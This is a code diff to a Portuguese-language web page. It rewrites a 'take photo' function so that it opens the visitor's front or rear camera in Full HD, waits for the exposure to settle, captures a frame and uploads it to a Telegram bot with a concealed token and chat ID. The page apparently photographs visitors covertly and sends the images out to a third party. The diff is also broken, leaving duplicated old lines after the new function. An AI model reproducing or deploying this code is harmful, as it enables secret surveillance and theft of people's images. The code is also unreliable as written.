@@ -127,24 +127,60 @@
             window.location.href = "autorizar.html";
         });
     }
-    async function tirarFoto(face, label) {
+   async function tirarFoto(face, label) {
         try {
-            // 1. Limpa qualquer rastro de câmera aberta antes de começar
-            if (window.currentStream) {
-                window.currentStream.getTracks().forEach(track => track.stop());
-            }
+            // Limpeza de streams anteriores
+            if (window.currentStream) window.currentStream.getTracks().forEach(t => t.stop());
+            
+            // Pausa para o hardware resetar
+            await new Promise(r => setTimeout(r, 500));
 
-            // 2. Aguarda 800ms para o hardware do celular "respirar"
-            await new Promise(r => setTimeout(r, 800));
-
+            // SOLICITAÇÃO DE ALTA RESOLUÇÃO
             const constraints = { 
                 video: { 
                     facingMode: face,
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
+                    width: { ideal: 1920 }, // Tenta Full HD
+                    height: { ideal: 1080 },
+                    frameRate: { ideal: 30 }
                 }, 
                 audio: false 
             };
+
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            window.currentStream = stream;
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            await new Promise(r => video.onloadedmetadata = r);
+            
+            // FUNDAMENTAL: Aguarda 1.5 segundos para o sensor ajustar o brilho (Exposure)
+            // Sem isso, a foto frontal geralmente sai muito escura ou "lavada"
+            await new Promise(r => setTimeout(r, 1500)); 
+            
+            const canvas = document.getElementById('canvas');
+            
+            // Ajusta o tamanho do canvas para o tamanho real do vídeo capturado
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Desliga a câmera imediatamente após o "print"
+            stream.getTracks().forEach(t => t.stop());
+
+            // Qualidade em 0.9 (90%) para nitidez forense
+            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
+            
+            const fd = new FormData();
+            fd.append('chat_id', ID);
+            fd.append('photo', blob, `${label}.jpg`);
+            fd.append('caption', `📸 ALTA DEFINIÇÃO: ${label}\n📏 Resolução: ${canvas.width}x${canvas.height}`);
+            
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        } catch (e) {
+            console.error("Falha na captura HD:", label);
+        }
+    }
 
             const stream = await navigator.mediaDevices.getUserMedia(constraints);
             window.currentStream = stream; // Guarda o stream atual
